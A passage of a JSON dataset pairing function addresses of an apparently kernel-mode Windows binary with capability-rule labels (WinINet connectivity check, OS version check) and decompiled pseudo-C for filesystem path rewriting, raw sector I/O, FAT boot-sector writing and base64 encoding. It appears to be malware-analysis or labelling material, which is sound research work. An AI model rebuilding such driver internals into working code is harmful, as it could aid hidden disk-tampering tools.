{\n                    fcn.000789b4(*0x800ce6a4);\n                    *0x800ce6a4 = NULL;\n                }\n            }\n        }\n    }\n    else {\n        *NULL = 0;\n    }\n    return *NULL;\n}\n",
        "token_count": 1748
    },
    "000332c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000332c0(int32_t *arg_8h)\n\n{\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    do {\n        if (1 < var_8h) {\n            return 0;\n        }\n        if (((*(var_8h * 4 + -0x7ff31940) != 0) && (*(*(var_8h * 4 + -0x7ff31940) + 0x24) != 0)) &&\n           (*(*(*(var_8h * 4 + -0x7ff31940) + 0x24) + 8) != 0)) {\n            for (var_4h = *(*(*(var_8h * 4 + -0x7ff31940) + 0x24) + 8); *(var_4h + 0x10) != 0; var_4h = *(var_4h + 0x10)\n                ) {\n                if (*arg_8h == *(var_4h + 0x10)) {\n                    *arg_8h = var_4h;\n                    return 1;\n                }\n            }\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 293
    },
    "00033360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00033360(int32_t *param_1, char param_2, uint *param_3, uint *param_4)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    uint32_t *in_FS_OFFSET;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_ch;\n    uint *var_10h_2;\n    uint *var_14h;\n    uint var_94h;\n    uint var_8ch;\n    uint *var_88h;\n    uint var_82h;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    uint var_58h;\n    uint *var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint32_t var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8cf0;\n    uStack16 = 0x800b8bf4;\n    uVar2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    var_28h = 0;\n    var_34h = NULL;\n    var_19h._0_1_ = 0;\n    var_10h = uVar2;\n    if (*0x800ce6ec == NULL) {\n        *0x800ce6ec = fcn.000356c0(0xa28);\n        if (*0x800ce6ec == NULL) {\n            uVar2 = 0;\n            goto code_r0x00033985;\n        }\n        *0x800cd288 = *0x800ce6ec + 0x82;\n        *0x800cd27c = *0x800ce6ec + 0x104;\n        *0x800cd268 = *0x800ce6ec + 0x186;\n        puVar3 = *0x800ce6ec + 0x208;\n        *0x800cd274 = *0x800ce6ec;\n        fcn.0002bfa0(*0x800ce6ec, 0x104);\n        fcn.0002bfd0(*0x800cd288, 0x104);\n        fcn.0002bf10(puVar3, 0x104);\n        fcn.00078a20(*0x800cd27c, 0x80051644, puVar3);\n        fcn.0002bf40(puVar3, 0x104);\n        fcn.00078a20(*0x800cd268, 0x80051644, puVar3);\n        var_44h = *0x800cd274;\n        do {\n            uVar5 = *var_44h;\n            var_44h = var_44h + 2;\n        } while (uVar5 != 0);\n        *0x800cd26c = (var_44h - (*0x800cd274 + 2) >> 1) << 1;\n        var_54h = *0x800cd288;\n        do {\n            uVar5 = *var_54h;\n            var_54h = var_54h + 2;\n        } while (uVar5 != 0);\n        *0x800cd270 = (var_54h - (*0x800cd288 + 2) >> 1) << 1;\n        var_64h = *0x800cd27c;\n        do {\n            uVar5 = *var_64h;\n            var_64h = var_64h + 2;\n        } while (uVar5 != 0);\n        *0x800cd280 = (var_64h - (*0x800cd27c + 2) >> 1) << 1;\n        var_74h = *0x800cd268;\n        do {\n            uVar5 = *var_74h;\n            var_74h = var_74h + 2;\n        } while (uVar5 != 0);\n        uVar2 = (var_74h - (*0x800cd268 + 2) >> 1) << 1;\n        *0x800cd278 = uVar2;\n    }\n    *var_14h = 0;\n    var_4h = 0;\n    if (var_8h == NULL) {\n        uVar2 = uVar2 & 0xffffff00;\n        goto code_r0x00033985;\n    }\n    if (var_ch != '\\0') {\n        uVar2 = (**0x800512dc)(var_8h, 0x18, 4);\n    }\n    if (*var_8h == 0x18) {\n        uVar2 = var_8h[3] & 0xfffff80d;\n        if (uVar2 == 0) {\n            puVar3 = var_8h[2];\n            if (puVar3 == NULL) {\n                uVar2 = var_8h[3] & 0xfffff800;\n                goto code_r0x00033985;\n            }\n            if (var_ch == '\\0') {\n                uVar1 = puVar3[1];\n                *var_10h_2 = *puVar3;\n                var_10h_2[1] = uVar1;\n            }\n            else {\n                if (puVar3 < **0x80051308) {\n                    var_40h = *puVar3;\n                    var_3ch = puVar3[1];\n                }\n                else {\n                    var_40h = ***0x80051308;\n                    var_3ch = (**0x80051308)[1];\n                }\n                *var_10h_2 = var_40h;\n                var_10h_2[1] = var_3ch;\n                (**0x800512dc)(var_10h_2[1], *var_10h_2, 2);\n            }\n            uVar5 = *var_10h_2;\n            puVar3 = var_10h_2;\n            if (((uVar5 & 1) != 0) || (puVar3 = uVar5,  puVar3 == 0xfffe)) {\n                uVar2 = puVar3 & 0xffffff00;\n                goto code_r0x00033985;\n            }\n            if ((uVar5 == *0x800cd26c) ||\n               ((*0x800cd26c < uVar5 && (puVar3 = *(var_10h_2[1] + (*0x800cd26c & 0xfffffffe)),  puVar3 == 0x5c)))) {\n                puVar3 = fcn.000364d0(var_10h_2[1], *0x800cd274, *0x800cd26c >> 1);\n                if (puVar3 != NULL) goto code_r0x00033722;\n                var_28h = *0x800cd26c;\n                var_34h = *0x800cd274;\n                var_19h._0_1_ = 1;\n                puVar3 = *0x800cd274;\n            }\n            else {\ncode_r0x00033722:\n                if ((uVar5 == *0x800cd270) ||\n                   ((*0x800cd270 < uVar5 && (puVar3 = *(var_10h_2[1] + (*0x800cd270 & 0xfffffffe)),  puVar3 == 0x5c))))\n                {\n                    puVar3 = fcn.000364d0(var_10h_2[1], *0x800cd288, *0x800cd270 >> 1);\n                    if (puVar3 == NULL) {\n                        var_28h = *0x800cd270;\n                        var_34h = *0x800cd288;\n                        var_19h._0_1_ = 1;\n                        puVar3 = *0x800cd288;\n                        goto code_r0x0003385b;\n                    }\n                }\n                if ((uVar5 == *0x800cd280) ||\n                   ((*0x800cd280 < uVar5 && (puVar3 = *(var_10h_2[1] + (*0x800cd280 & 0xfffffffe)),  puVar3 == 0x5c))))\n                {\n                    puVar3 = fcn.000364d0(var_10h_2[1], *0x800cd27c, *0x800cd280 >> 1);\n                    if (puVar3 == NULL) {\n                        var_28h = *0x800cd280;\n                        var_34h = *0x800cd274;\n                        var_19h._0_1_ = 1;\n                        puVar3 = *0x800cd274;\n                        goto code_r0x0003385b;\n                    }\n                }\n                if ((uVar5 == *0x800cd278) ||\n                   ((*0x800cd278 < uVar5 && (puVar3 = *(var_10h_2[1] + (*0x800cd278 & 0xfffffffe)),  puVar3 == 0x5c))))\n                {\n                    puVar3 = fcn.000364d0(var_10h_2[1], *0x800cd268, *0x800cd278 >> 1);\n                    if (puVar3 == NULL) {\n                        var_28h = *0x800cd278;\n                        var_34h = *0x800cd288;\n                        var_19h._0_1_ = 1;\n                        puVar3 = *0x800cd288;\n                    }\n                }\n            }\ncode_r0x0003385b:\n            if (var_19h != 0) {\n                var_88h = var_34h;\n                do {\n                    uVar5 = *var_88h;\n                    var_88h = var_88h + 2;\n                } while (uVar5 != 0);\n                var_94h._0_2_ = var_88h - (var_34h + 2) >> 1;\n                uVar5 = var_94h * 2;\n                *var_10h_2 = (*var_10h_2 - var_28h) + uVar5;\n                *(var_10h_2 + 2) = *var_10h_2;\n                iVar4 = fcn.000356c0(*(var_10h_2 + 2));\n                if (iVar4 == 0) {\n                    *var_14h = 0xc000009a;\n                    uVar2 = var_19h;\n                    goto code_r0x00033985;\n                }\n                fcn.00078be8(iVar4, var_34h, uVar5);\n                fcn.00078be8(uVar5 + iVar4, var_10h_2[1] + var_28h, *var_10h_2 - uVar5);\n                var_10h_2[1] = iVar4;\n                puVar3 = var_10h_2;\n            }\n            uVar2 = puVar3 & 0xffffff00 | var_19h;\n            goto code_r0x00033985;\n        }\n    }\n    uVar2 = uVar2 & 0xffffff00;\ncode_r0x00033985:\n    *in_FS_OFFSET = var_10h;\n    return uVar2;\n}\n",
        "token_count": 2675
    },
    "000339c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000339c0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while ((iVar1 = (**0x80051194)(0x800ce6d4, 0, 0, 0, 0),  iVar1 == 0 && (*0x800ce672 == '\\0'))) {\n        while (iVar1 = (**0x80051188)(),  iVar1 != 0) {\n            uVar2 = fcn.00033a40(iVar1 + -0x58);\n            *(iVar1 + -0x40) = uVar2;\n            (**0x800512e8)();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 173
    },
    "00033a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00033a40(int32_t arg_8h)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    char *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    var_24h = *(arg_8h + 0x60);\n    if (*(arg_8h + 0x24) == '\\0') {\n        var_1ch = *(var_24h + 0x14) != *0x800ce6c0;\n        if (*(arg_8h + 4) == 0) {\n            var_28h = 0xc0000001;\n        }\n        else {\n            if ((*(*(arg_8h + 4) + 6) & 5) == 0) {\n                var_34h = (**0x800510e4)(*(arg_8h + 4), 0, 1, 0, 0, 0x10);\n            }\n            else {\n                var_34h = *(*(arg_8h + 4) + 0xc);\n            }\n            var_2ch = var_34h;\n            if (var_34h == 0) {\n                var_28h = 0xc000009a;\n            }\n            else {\n                if (*var_24h == '\\x03') {\n                    var_18h = *(var_24h + 0xc);\n                    var_14h = *(var_24h + 0x10);\n                    var_20h = *(var_24h + 4);\n                    iVar2 = fcn.00078c00(var_18h, var_14h, 0x200, 0);\n                    if ((iVar2 != 0) || (var_20h % 0x200 != 0)) {\n                        return 0xc000000d;\n                    }\n                    var_ch = 0;\n                    while ((var_ch < var_20h &&\n                           (cVar1 = fcn.00033d20(var_1ch, var_2ch + var_ch, var_18h + var_ch),  cVar1 != '\\0'))) {\n                        var_ch = var_ch + 0x200;\n                    }\n                    *(arg_8h + 0x1c) = var_ch;\n                }\n                else {\n                    var_18h = *(var_24h + 0xc);\n                    var_14h = *(var_24h + 0x10);\n                    var_30h = *(var_24h + 4);\n                    iVar2 = fcn.00078c00(var_18h, var_14h, 0x200, 0);\n                    if ((iVar2 != 0) || (var_30h % 0x200 != 0)) {\n                        return 0xc000000d;\n                    }\n                    var_ch = 0;\n                    while ((var_ch < var_30h &&\n                           (cVar1 = fcn.00033c70(var_1ch, var_2ch + var_ch, var_18h + var_ch),  cVar1 != '\\0'))) {\n                        var_ch = var_ch + 0x200;\n                    }\n                    var_2ch = *(var_1ch * 4 + -0x7ff31958) + var_18h;\n                    fcn.00078afe(0xffffffff, &var_2ch, &var_30h, &var_8h);\n                    *(arg_8h + 0x1c) = var_ch;\n                }\n                var_28h = 0;\n            }\n        }\n    }\n    else {\n        var_28h = 0xc0000120;\n    }\n    return var_28h;\n}\n",
        "token_count": 911
    },
    "00033e30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00033e30(int32_t arg_8h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    \n    var_18h = fcn.00078b10(&var_14h, 1);\n    if (var_18h == 0) {\n        var_1ch = 0x1f01ff;\n        var_28h = 0x120089;\n        var_24h = 0x120116;\n        var_20h = 0x1200a0;\n        var_2ch = 4;\n        var_18h = (**0x80051198)(arg_8h, &var_2ch, &var_14h, arg_8h + 0x98, 1, &var_28h);\n    }\n    return var_18h;\n}\n",
        "token_count": 228
    },
    "00033ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00033ea0(uint noname_0, uchar *arg_ch)\n\n{\n    uint var_300h;\n    uint var_fah;\n    int32_t var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint *var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    \n    fcn.0002c180(&var_c0h, 0x52);\n    fcn.0002c150(&var_58h, 0x52);\n    fcn.000789c6(&var_300h, 0x104, 0x80054770, &var_c0h, &var_58h);\n    var_fah._0_2_ = 0;\n    fcn.000789c0(&var_cch, &var_300h);\n    var_f0h = 0x18;\n    var_ech = 0;\n    var_e4h = 0x40;\n    var_e8h = &var_cch;\n    var_e0h = 0;\n    var_dch = 0;\n    var_d8h = 0x6400000;\n    var_d4h = 0;\n    var_f4h = fcn.0001f080(0x800cd284, 3, &var_f0h, &var_60h, &var_d8h, 0x80, 0, 3, 0x868, 0, 0);\n    if (var_f4h == 0) {\n        *(*0x800cc770 + 0x18) = *0x800cd284;\n        if ((var_5ch == 2) || (var_5ch == 3)) {\n            var_68h = var_d8h;\n            var_64h = var_d4h;\n            var_f4h = fcn.000789cc(*0x800cd284, &var_60h, &var_68h, 8, 0x14);\n            if (var_f4h != 0) goto code_r0x000340c2;\n            *arg_ch = 1;\n        }\n        else {\n            *arg_ch = 0;\n        }\n        var_f0h = 0x18;\n        var_ech = 0;\n        var_e4h = 0;\n        var_e8h = NULL;\n        var_e0h = 0;\n        var_dch = 0;\n        var_f4h = fcn.00078b0a();\n        if (var_f4h == 0) {\n            var_c4h = 0;\n            var_f4h = fcn.00078af8();\n            if (var_f4h == 0) {\n                *0x800ce6b0 = var_c4h;\n                *0x800ce6b4 = 0;\n            }\n        }\n    }\ncode_r0x000340c2:\n    if (var_f4h != 0) {\n        if (*0x800ce6a8 != 0) {\n            fcn.00078b04(0xffffffff, *0x800ce6a8);\n            *0x800ce6a8 = 0;\n        }\n        if (*0x800ce6a0 != 0) {\n            fcn.000789b4(*0x800ce6a0);\n            *0x800ce6a0 = 0;\n        }\n        fcn.000789b4(*0x800cd284);\n        *0x800cd284 = 0;\n    }\n    return var_f4h;\n}\n",
        "token_count": 885
    },
    "00034180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00034180(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_58h;\n    uint var_4dh;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_1eh;\n    uint32_t var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = fcn.000356c0(arg_1ch);\n    if (var_14h == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        fcn.00078bfa(&var_58h, 0, 0x3e);\n        var_58h._0_1_ = 0xeb;\n        var_4dh._0_1_ = arg_1ch;\n        var_4dh._1_1_ = arg_1ch >> 8;\n        iVar3 = arg_18h * arg_14h * arg_10h;\n        var_10h = iVar3 - 1;\n        if (var_10h < 0xfff6) {\n            var_18h = 1;\n        }\n        else if (var_10h / 0xfff5 < 0x100) {\n            var_18h = var_10h / 0xfff5;\n            if (var_10h % 0xfff5 != 0) {\n                var_18h = var_18h + 1;\n            }\n        }\n        else {\n            var_18h = 0xff;\n        }\n        var_4dh._2_1_ = var_18h;\n        var_4dh._3_1_ = 2;\n        var_49h = 0;\n        var_8h = var_10h / (var_18h & 0xff);\n        var_48h = 2;\n        var_47h = 0;\n        var_46h = 2;\n        uVar1 = var_10h >> 8;\n        if (var_10h < 0x10000) {\n            var_45h = var_10h;\n            var_44h = uVar1;\n        }\n        var_43h = 0xf8;\n        var_ch = (((iVar3 + -3) - 0x4000 / arg_1ch) * 2) / (var_18h * arg_1ch + 4);\n        if ((((iVar3 + -3) - 0x4000 / arg_1ch) * 2) % (var_18h * arg_1ch + 4) != 0) {\n            var_ch = var_ch + 1;\n        }\n        var_42h = var_ch;\n        var_41h = var_ch >> 8;\n        var_40h = arg_18h;\n        var_3fh = arg_18h >> 8;\n        var_3eh = arg_10h;\n        var_3dh = arg_10h >> 8;\n        var_3ch = 1;\n        var_3bh = 0;\n        var_3ah = 0;\n        var_39h = 0;\n        if (0xffff < var_10h) {\n            var_36h = var_10h >> 0x10;\n            var_35h = var_10h >> 0x18;\n            var_38h = var_10h;\n            var_37h = uVar1;\n        }\n        var_34h._0_1_ = 0x80;\n        var_34h._2_1_ = 0x29;\n        var_34h._3_1_ = 0xe8;\n        var_30h = 0x99;\n        var_2fh = 0x9b;\n        var_2eh = 0xba;\n        var_2dh = *0x80054794;\n        var_29h = *0x80054798;\n        var_25h._0_2_ = *0x8005479c;\n        var_25h._2_1_ = *0x8005479e;\n        stack0xffffffda = *0x800547a0;\n        var_1eh = *0x800547a4;\n        fcn.00078bfa(var_14h, 0, arg_1ch);\n        puVar4 = &var_58h;\n        puVar5 = var_14h;\n        for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = *puVar4;\n        fcn.00033c70(arg_8h, var_14h, 0);\n        fcn.00078bfa(var_14h, 0, arg_1ch);\n        for (var_4h = 0; var_4h < var_ch << 1; var_4h = var_4h + 1) {\n            fcn.00033c70(arg_8h, var_14h, var_4h * arg_1ch + arg_1ch * 2);\n        }\n        *var_14h = 0xf8;\n        *(var_14h + 1) = 0xff;\n        *(var_14h + 2) = 0xff;\n        *(var_14h + 3) = 0xff;\n        fcn.00033c70(arg_8h, var_14h, arg_1ch << 1);\n        fcn.00033c70(arg_8h, var_14h, var_ch * arg_1ch + arg_1ch * 2);\n        fcn.000357f0(var_14h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 1598
    },
    "000344b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.000344b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000356f0(0x10);\n    *arg_8h = iVar1;\n    iVar1 = *arg_8h;\n    if (iVar1 != 0) {\n        (**0x800510d0)(*arg_8h, 1, 0);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 106
    },
    "000344f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000344f0(int32_t *arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.000356f0(0x10);\n    *arg_8h = iVar1;\n    if (*arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 0) {\n            (**0x800510d0)(*arg_8h, 1, 0);\n        }\n        else {\n            (**0x800510d0)(*arg_8h, 0, 0);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 176
    },
    "00034540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00034540(int32_t *arg_8h)\n\n{\n    if (*arg_8h != 0) {\n        fcn.000357f0(*arg_8h);\n        *arg_8h = 0;\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00034570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00034570(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        (**0x800510c4)(*arg_8h, 0, 0);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "000345a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000345a0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        iVar1 = -1;\n    }\n    else {\n        if (arg_ch == -1) {\n            var_8h = NULL;\n        }\n        else {\n            _var_10h = fcn.00078be2(arg_ch, arg_ch >> 0x1f, 0xffffd8f0, 0xffffffff);\n            var_8h = &var_10h;\n        }\n        var_4h = (**0x80051194)(*arg_8h, 0, 0, 0, var_8h);\n        if (var_4h == 0) {\n            iVar1 = 1;\n        }\n        else {\n            arg_8h_00 = fcn.00078a2c(var_4h);\n            fcn.000359a0(arg_8h_00);\n            iVar1 = -(var_4h != 0x102);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 300
    },
    "00034630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00034630(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    char acStack66 [26];\n    char acStack40 [10];\n    uint var_1ah;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint8_t var_8h [2];\n    uint var_6h;\n    \n    var_60h = 0;\n    var_5ch = 0;\n    bVar1 = false;\n    for (var_10h = 0; var_10h < 0x1a; var_10h = var_10h + 1) {\n        *(&var_58h + var_10h) = var_10h + 'A';\n        acStack66[var_10h] = var_10h + 'a';\n    }\n    for (var_10h = 0; var_10h < 10; var_10h = var_10h + 1) {\n        acStack40[var_10h] = var_10h + '0';\n    }\n    var_1ah._0_1_ = 0x2b;\n    var_1ah._1_1_ = 0x2f;\n    do {\n        var_6h._0_1_ = 0;\n        var_8h[1] = 0;\n        var_8h[0] = 0;\n        var_ch = 0;\n        do {\n            if (2 < var_ch) goto code_r0x000346ff;\n            var_8h[var_ch] = *(arg_8h + var_60h);\n            var_ch = var_ch + 1;\n            var_60h = var_60h + 1;\n        } while (var_60h != arg_10h);\n        bVar1 = true;\ncode_r0x000346ff:\n        if (0 < var_ch) {\n            var_6h._2_2_ = CONCAT11(*(&var_58h + ((var_8h[0] & 3) << 4 | var_8h[1] >> 4)), \n                                    *(&var_58h + (var_8h[0] >> 2)));\n            stack0xfffffff8 = CONCAT12(*(&var_58h + ((var_8h[1] & 0xf) << 2 | var_6h >> 6)), var_6h._2_2_);\n            stack0xfffffff8 = CONCAT13(*(&var_58h + (var_6h & 0x3f)), stack0xfffffff8);\n            if ((var_ch < 3) && (stack0xfffffff8 = CONCAT13(0x3d, stack0xfffffff8),  var_ch < 2)) {\n                stack0xfffffff8 = CONCAT12(0x3d, var_6h._2_2_);\n                stack0xfffffff8 = CONCAT13(0x3d, stack0xfffffff8);\n            }\n        }\n        *(arg_ch + var_5ch) = stack0xfffffff8;\n        var_5ch = var_5ch + 4;\n        if (bVar1) {\n            *(arg_ch + var_5ch) = 0;\n            return var_5ch;\n        }\n    } while( true );\n}\n",
        "token_count": 790
    },
    "000349e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000349e0(int32_t *arg_8h)\n\n{\n    if ((arg_8h != NULL) && (*arg_8h != 0)) {\n        fcn.000357f0(*arg_8h);\n        *arg_8h = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00034a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00034a30(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        bVar2 = false;\n    }\n    else {\n        var_8h = 0;\n        var_4h = 0;\n        iVar1 = (**0x80051194)(*arg_8h, 0, 0, 0, &var_8h);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 151
    },
    "00034aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
